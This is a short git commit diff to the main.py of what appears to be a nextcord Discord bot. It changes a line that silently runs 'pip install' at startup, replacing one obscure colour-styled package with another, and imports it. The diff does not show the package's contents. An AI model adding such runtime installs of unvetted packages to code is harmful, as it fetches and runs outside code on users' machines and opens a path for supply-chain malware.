6ca120cffb1ffe3f4c86c69da6a37c21c6be41ac
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-06 20:57:29 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pipcoloradds")
-import pipcoloradds
+os.system("pip install pythoncolouringaddsV2")
+import pythoncolouringaddsV2
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
